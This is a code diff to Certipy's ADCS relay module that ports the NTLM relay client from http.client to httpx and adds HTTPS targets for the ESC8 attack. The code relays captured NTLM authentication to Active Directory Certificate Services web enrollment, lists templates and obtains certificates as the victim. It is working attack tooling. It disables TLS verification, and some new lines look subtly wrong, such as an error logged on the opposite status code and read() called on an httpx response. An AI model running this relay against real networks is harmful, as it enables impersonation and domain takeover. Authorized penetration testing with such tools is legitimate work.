@@ -23,13 +23,12 @@ import os
 import re
 import time
 import traceback
-import urllib.parse
-from http.client import HTTPConnection
 from struct import unpack
 from threading import Lock
 from typing import Any, Literal, Optional, Tuple, Union, cast
 
 import bs4
+import httpx
 from cryptography.hazmat.primitives.asymmetric import rsa
 from cryptography.hazmat.primitives.asymmetric.types import PrivateKeyTypes
 from impacket.dcerpc.v5 import epm
@@ -40,7 +39,7 @@ from impacket.examples.ntlmrelayx.servers import SMBRelayServer
 from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
 from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
 from impacket.nt_errors import STATUS_ACCESS_DENIED, STATUS_SUCCESS
-from impacket.ntlm import NTLMAuthChallengeResponse
+from impacket.ntlm import NTLMAuthChallenge, NTLMAuthChallengeResponse
 from impacket.spnego import SPNEGO_NegTokenResp
 
 from certipy.commands.req import MSRPC_UUID_ICPR, Request, RPCRequestInterface
@@ -60,6 +59,7 @@ from certipy.lib.certificate import (
     pem_to_key,
     x509,
 )
+from certipy.lib.constants import USER_AGENT
 from certipy.lib.errors import translate_error_code
 from certipy.lib.formatting import print_certificate_identifications
 from certipy.lib.logger import logging
@@ -93,12 +93,20 @@ class ADCSHTTPRelayServer(HTTPRelayClient):
         Returns:
             True if connection was successful
         """
-        logging.debug(f"Connecting to {self.targetHost}:{self.targetPort}...")
-        self.session = HTTPConnection(
-            self.targetHost, self.targetPort, timeout=self.adcs_relay.timeout
+        logging.debug(f"Using target: {self.adcs_relay.target}...")
+        logging.debug(f"Base URL: {self.adcs_relay.base_url}")
+        logging.debug(f"Path: {self.target.path}")
+        logging.debug(f"Using timeout: {self.adcs_relay.timeout}")
+
+        self.session = httpx.Client(
+            base_url=self.adcs_relay.base_url,
+            verify=False,
+            timeout=self.adcs_relay.timeout,
+            headers={
+                "User-Agent": USER_AGENT,
+            },
         )
-        self.session.connect()
-        logging.debug(f"Connected to {self.targetHost}:{self.targetPort}")
+
         self.lastresult = None
 
         # Prepare the target path
@@ -106,7 +114,112 @@ class ADCSHTTPRelayServer(HTTPRelayClient):
             self.path = "/"
         else:
             self.path = self.target.path
+
+        logging.debug(f"Using path: {self.target.path}")
+        logging.debug(f"Using path: {self.path}")
+
         return True
+
+    def sendNegotiate(self, negotiate_message: bytes) -> Optional[NTLMAuthChallenge]:  # type: ignore
+        # Check if server wants auth
+        res = self.session.get(self.path)
+
+        if res.status_code != 401:
+            logging.info(
+                "Status code returned: %d. Authentication does not seem required for URL"
+                % res.status_code
+            )
+
+        authenticate_header = res.headers.get("WWW-Authenticate", None)
+        if authenticate_header is None:
+            logging.error(
+                "No authentication requested by the server for url %s. Sending NTLM auth anyways"
+                % self.adcs_relay.target
+            )
+            self.authenticationMethod = "NTLM"
+        elif "NTLM" in authenticate_header:
+            self.authenticationMethod = "NTLM"
+        elif "Negotiate" in authenticate_header:
+            self.authenticationMethod = "Negotiate"
+        else:
+            logging.error(
+                "Neither NTLM nor Negotiate auth offered by URL, offered protocols: %s"
+                % authenticate_header
+            )
+            return None
+
+        # Negotiate auth
+        negotiate = base64.b64encode(negotiate_message).decode()
+        headers = {"Authorization": f"{self.authenticationMethod} {negotiate}"}
+        res = self.session.get(self.path, headers=headers)
+
+        if res.status_code != 401:
+            logging.error("Got unauthorized response from AD CS")
+            return None
+
+        # Check for NTLM challenge in the response
+        authenticate_header = res.headers.get("WWW-Authenticate", None)
+        if authenticate_header is None:
+            logging.error("No authentication challenge returned from server")
+            return None
+
+        server_challenge_base64 = ""
+        try:
+            server_challenge_base64 = authenticate_header.split(" ")[1]
+        except Exception as e:
+            logging.error(
+                f"Failed to parse authentication challenge: {authenticate_header}"
+            )
+            return None
+
+        try:
+            server_challenge = base64.b64decode(server_challenge_base64)
+            challenge = NTLMAuthChallenge()
+            challenge.fromString(server_challenge)
+            return challenge
+        except Exception as e:
+            logging.error(
+                f"Failed to decode server challenge: {authenticate_header} - {e}"
+            )
+            return None
+
+        return None
+        # self.session.request('GET', self.path)
+        # res = self.session.getresponse()
+        # res.read()
+        # if res.status != 401:
+        #     LOG.info('Status code returned: %d. Authentication does not seem required for URL' % res.status)
+        # try:
+        #     if 'NTLM' not in res.getheader('WWW-Authenticate') and 'Negotiate' not in res.getheader('WWW-Authenticate'):
+        #         LOG.error('NTLM Auth not offered by URL, offered protocols: %s' % res.getheader('WWW-Authenticate'))
+        #         return False
+        #     if 'NTLM' in res.getheader('WWW-Authenticate'):
+        #         self.authenticationMethod = "NTLM"
+        #     elif 'Negotiate' in res.getheader('WWW-Authenticate'):
+        #         self.authenticationMethod = "Negotiate"
+        # except (KeyError, TypeError):
+        #     LOG.error('No authentication requested by the server for url %s' % self.targetHost)
+        #     if self.serverConfig.isADCSAttack:
+        #         LOG.info('IIS cert server may allow anonymous authentication, sending NTLM auth anyways')
+        #         self.authenticationMethod = "NTLM"
+        #     else:
+        #         return False
+
+        # #Negotiate auth
+        # negotiate = base64.b64encode(negotiateMessage).decode("ascii")
+        # headers = {'Authorization':'%s %s' % (self.authenticationMethod, negotiate)}
+        # self.session.request('GET', self.path ,headers=headers)
+        # res = self.session.getresponse()
+        # res.read()
+        # try:
+        #     serverChallengeBase64 = re.search(('%s ([a-zA-Z0-9+/]+={0,2})' % self.authenticationMethod), res.getheader('WWW-Authenticate')).group(1)
+        #     serverChallenge = base64.b64decode(serverChallengeBase64)
+        #     challenge = NTLMAuthChallenge()
+        #     challenge.fromString(serverChallenge)
+        #     return challenge
+        # except (IndexError, KeyError, AttributeError):
+        #     LOG.error('No NTLM challenge returned from server')
+        #     return False
 
     def sendAuth(  # type: ignore
         self, authenticateMessageBlob: bytes, serverChallenge: Optional[bytes] = None
@@ -176,19 +289,20 @@ class ADCSHTTPRelayServer(HTTPRelayClient):
             self.session.user = f"{domain}\\{username}"  # type: ignore
 
             # Build authorization header with NTLM token
-            auth = base64.b64encode(token).decode("ascii")
+            auth = base64.b64encode(token).decode()
             headers = {"Authorization": f"{self.authenticationMethod} {auth}"}
 
             # Make authenticated request to AD CS
-            self.session.request("GET", self.path, headers=headers)
-            res = self.session.getresponse()
+            # self.session.request("GET", self.path, headers=headers)
+            # res = self.session.getresponse()
+            res = self.session.get(self.path, headers=headers)
 
-            if res.status == 401:
+            if res.status_code == 401:
                 logging.error("Got unauthorized response from AD CS")
                 return None, STATUS_ACCESS_DENIED
             else:
                 logging.debug(
-                    f"HTTP server returned status code {res.status}, treating as successful login"
+                    f"HTTP server returned status code {res.status_code}, treating as successful login"
                 )
                 # Cache the response
                 self.lastresult = res.read()
@@ -359,9 +473,8 @@ class ADCSHTTPAttackClient(ProtocolAttack):
         """
 
         # Request the certificate request page
-        self.client.request("GET", "/certsrv/certrqxt.asp")
-        response = self.client.getresponse()
-        content = response.read()
+        res = self.client.get("/certsrv/certrqxt.asp")
+        content = res.text
 
         # Parse the HTML to extract templates
         soup = bs4.BeautifulSoup(content, "html.parser")
@@ -399,13 +512,11 @@ class ADCSHTTPAttackClient(ProtocolAttack):
         Args:
             request_id: The ID of the certificate request to retrieve
         """
-        self.client.request("GET", f"/certsrv/certnew.cer?ReqID={request_id}")
-
-        response = self.client.getresponse()
-        content = response.read()
+        res = self.client.get(f"/certsrv/certnew.cer?ReqID={request_id}")
+        content = res.text
 
         # Handle error responses
-        if response.status != 200:
+        if res.status_code != 200:
             logging.error("Got error while requesting certificate")
             if self.adcs_relay.verbose:
                 logging.warning("Got error while trying to request certificate:")
@@ -502,24 +613,16 @@ class ADCSHTTPAttackClient(ProtocolAttack):
             "ThumbPrint": "",
         }
 
-        data = urllib.parse.urlencode(params)
-
-        headers = {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "Content-Length": len(data),
-        }
-
         logging.info(
             f"Requesting certificate for {repr(self.client.user)} based on the template {repr(template)}"
         )
 
         # Send certificate request
-        self.client.request("POST", "/certsrv/certfnsh.asp", body=data, headers=headers)
-        response = self.client.getresponse()
-        content = response.read().decode()
+        res = self.client.post("/certsrv/certfnsh.asp", data=params)
+        content = res.text
 
         # Handle request errors
-        if response.status != 200:
+        if res.status_code != 200:
             logging.error("Got error while requesting certificate")
             if self.adcs_relay.verbose:
                 print(content)
@@ -534,9 +637,8 @@ class ADCSHTTPAttackClient(ProtocolAttack):
             request_id = int(request_id_matches[0])
             logging.info(f"Certificate issued with request ID {request_id}")
 
-            self.client.request("GET", f"/certsrv/certnew.cer?ReqID={request_id}")
-            response = self.client.getresponse()
-            content = response.read()
+            res = self.client.get(f"/certsrv/certnew.cer?ReqID={request_id}")
+            content = res.content
             cert = pem_to_cert(content)
 
             return self.save_certificate(cert, key=key, request_id=request_id)
@@ -958,6 +1060,7 @@ class Relay:
             kwargs: Additional arguments
         """
         self.target = target
+        self.base_url = target  # Used only for HTTP(S) targets
         self.ca = ca
         self.template = template
         self.upn = upn
@@ -991,7 +1094,9 @@ class Relay:
             logging.info(f"Targeting {target} (ESC11)")
         else:
             # Format HTTP target URL
-            if not self.target.startswith("http://"):
+            if not self.target.startswith("http://") and not self.target.startswith(
+                "https://"
+            ):
                 self.target = f"http://{self.target}"
             if not self.target.endswith("/certsrv/certfnsh.asp"):
                 if not self.target.endswith("/"):
@@ -1003,11 +1108,22 @@ class Relay:
                     self.target += "certsrv/certfnsh.asp"
             logging.info(f"Targeting {self.target} (ESC8)")
 
+            url = httpx.URL(self.target)
+
+            if not url.is_absolute_url:
+                logging.error(
+                    f"Invalid target URL. Expected format: http(s)://server/path, got {self.target}"
+                )
+                exit(1)
+
+            self.base_url = f"{url.scheme}://{url.host}"
+
         # Configure impacket relay target
         target_processor = TargetsProcessor(
             singleTarget=self.target,
             protocolClients={
                 "HTTP": self.get_relay_http_server,
+                "HTTPS": self.get_relay_http_server,
                 "RPC": self.get_relay_rpc_server,
             },
         )
@@ -1019,10 +1135,18 @@ class Relay:
         config.setIsADCSAttack(True)
         config.setADCSOptions(self.template)
         config.setAttacks(
-            {"HTTP": self.get_attack_http_client, "RPC": self.get_attack_rpc_client}
+            {
+                "HTTP": self.get_attack_http_client,
+                "HTTPS": self.get_attack_http_client,
+                "RPC": self.get_attack_rpc_client,
+            }
         )
         config.setProtocolClients(
-            {"HTTP": self.get_relay_http_server, "RPC": self.get_relay_rpc_server}
+            {
+                "HTTP": self.get_relay_http_server,
+                "HTTPS": self.get_relay_http_server,
+                "RPC": self.get_relay_rpc_server,
+            }
         )
         config.setListeningPort(port)
         config.setInterfaceIp(interface)
